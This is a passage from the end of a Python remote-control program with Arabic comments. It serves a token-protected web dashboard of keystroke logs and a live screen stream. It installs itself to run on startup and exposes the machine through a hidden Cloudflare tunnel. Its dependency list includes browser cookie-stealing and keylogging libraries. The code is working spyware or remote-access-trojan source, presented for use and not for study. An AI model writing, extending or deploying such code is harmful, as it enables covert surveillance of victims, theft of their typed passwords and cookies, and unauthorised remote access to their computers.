                            }}
                        }})
                        .catch(error => {{
                            alert('حدث خطأ في الاتصال: ' + error);
                        }});
                }}
            }}
        </script>
    </body>
    </html>
    """
    
    return web.Response(text=html, content_type='text/html')

async def uninstall_handler(request):
    """معالج إلغاء التثبيت"""
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.json_response({"error": "Unauthorized"}, status=401)
    
    try:
        success = uninstall_system()
        if success:
            return web.json_response({"success": True, "message": "تم إلغاء التثبيت بنجاح"})
        else:
            return web.json_response({"success": False, "error": "فشل في إلغاء التثبيت"})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)})

async def keylogs_handler(request):
    """معالج سجلات لوحة المفاتيح"""
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.Response(text="Unauthorized", status=401)
    
    try:
        conn = sqlite3.connect('./database/system_metrics.db')
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM key_logs ORDER BY timestamp DESC LIMIT 1000')
        logs = cursor.fetchall()
        
        conn.close()
        
        html = """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>سجلات لوحة المفاتيح</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
                .log-table { width: 100%; border-collapse: collapse; background: white; }
                .log-table th, .log-table td { padding: 10px; border: 1px solid #ddd; text-align: right; }
                .log-table th { background: #007bff; color: white; }
                .log-table tr:nth-child(even) { background: #f2f2f2; }
            </style>
        </head>
        <body>
            <h1>سجلات لوحة المفاتيح</h1>
            <table class="log-table">
                <tr>
                    <th>الوقت</th>
                    <th>النافذة</th>
                    <th>العملية</th>
                    <th>الحدث</th>
                </tr>
        """
        
        for log in logs:
            html += f"""
                <tr>
                    <td>{log[1]}</td>
                    <td>{log[2]}</td>
                    <td>{log[4]}</td>
                    <td>{log[3]}</td>
                </tr>
            """
        
        html += """
            </table>
        </body>
        </html>
        """
        
        return web.Response(text=html, content_type='text/html')
        
    except Exception as e:
        return web.Response(text=f"Error: {str(e)}", status=500)

# --------- Cloudflared محسن ---------
def setup_cloudflared_tunnel():
    """إعداد نفق Cloudflared مع تحسين الأداء"""
    try:
        cloudflared_path = download_cloudflared()
        if not cloudflared_path:
            return None
        
        startupinfo = None
        if platform.system() == "Windows":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
        
        process = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True,
            startupinfo=startupinfo
        )
        
        for _ in range(30):
            line = process.stdout.readline()
            if not line:
                break
            
            match = re.search(r"https://[^\s]+trycloudflare\.com", line)
            if match:
                cf_link = match.group(0)
                print(f"🌐 نفق Cloudflared جاهز: {cf_link}")
                return cf_link
        
        print("❌ فشل في إنشاء النفق")
        return None
        
    except Exception as e:
        logger.error(f"خطأ في إعداد نفق Cloudflared: {e}")
        return None

def download_cloudflared():
    """تنزيل Cloudflared إذا لم يكن موجوداً"""
    try:
        if platform.system() == "Windows":
            cloudflared_name = "cloudflared.exe"
            cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        elif platform.system() == "Linux":
            cloudflared_name = "cloudflared"
            cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        elif platform.system() == "Darwin":
            cloudflared_name = "cloudflared"
            cloudflared_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
        else:
            return None
        
        cloudflared_path = os.path.join(os.getcwd(), cloudflared_name)
        
        if os.path.exists(cloudflared_path):
            return cloudflared_path
        
        print("⬇️ جاري تحميل Cloudflared...")
        
        response = requests.get(cloudflared_url, stream=True)
        response.raise_for_status()
        
        with open(cloudflared_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        
        if platform.system() != "Windows":
            os.chmod(cloudflared_path, 0o755)
        
        print("✅ تم تحميل Cloudflared بنجاح")
        return cloudflared_path
        
    except Exception as e:
        print(f"❌ خطأ في تحميل Cloudflared: {e}")
        return None

# --------- الإعداد الرئيسي والتشغيل ---------
async def init_app():
    """تهيئة التطبيق مع المسارات المتقدمة"""
    app = web.Application()
    
    # إضافة المسارات
    app.router.add_get("/", lambda request: web.HTTPFound(f"/dashboard?token={TOKEN}"))
    app.router.add_get("/dashboard", system_dashboard_handler)
    app.router.add_get("/stream", advanced_stream_handler)
    app.router.add_get("/keylogs", keylogs_handler)
    app.router.add_post("/system/uninstall", uninstall_handler)
    
    return app

async def main():
    """الدالة الرئيسية"""
    print("🚀 بدء تشغيل نظام التحكم المتقدم...")
    print(f"🔑 رمز التحكم: {TOKEN}")
    print(f"🔒 كلمة المرور: {CONTROL_PASSWORD}")
    
    # تثبيت النظام للتشغيل التلقائي
    install_system()
    
    # تهيئة قاعدة البيانات
    init_database()
    
    # بدء مراقبة موارد النظام
    asyncio.create_task(monitor_system_resources())
    
    # بدء التقاط الشاشة المتقدم
    asyncio.create_task(advanced_capture_loop())
    
    # تهيئة التطبيق
    app = await init_app()
    runner = web.AppRunner(app)
    await runner.setup()
    
    # بدء الخادم
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    # عرض معلومات الوصول
    local_ip = socket.gethostbyname(socket.gethostname())
    print(f"📡 البث المحلي: http://{local_ip}:{PORT}/dashboard?token={TOKEN}")
    
    # إعداد نفق Cloudflared
    cf_link = setup_cloudflared_tunnel()
    if cf_link:
        print(f"🌐 الرابط الخارجي: {cf_link}/dashboard?token={TOKEN}")
    
    # البقاء في حلقة الانتظار
    try:
        await asyncio.Future()
    except KeyboardInterrupt:
        print("🛑 إيقاف السيرفر...")
    finally:
        await runner.cleanup()

if __name__ == "__main__":
    # التحقق من تثبيت الحزم المطلوبة
    required_packages = [
        'aiohttp', 'mss', 'opencv-python', 'numpy', 'requests', 
        'keyboard', 'pynput', 'psutil', 'humanize', 'screeninfo',
        'matplotlib', 'GPUtil', 'cryptography', 'browser_cookie3',
        'pycryptodome', 'pywin32', 'pyautogui'
    ]
    
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("❌ الحزم التالية غير مثبتة:")
        for pkg in missing_packages:
            print(f"  - {pkg}")
        print("📦 يرجى تثبيتها باستخدام:")
        print(f"pip install {' '.join(missing_packages)}")
        exit(1)
    
    # تشغيل التطبيق

    asyncio.run(main())
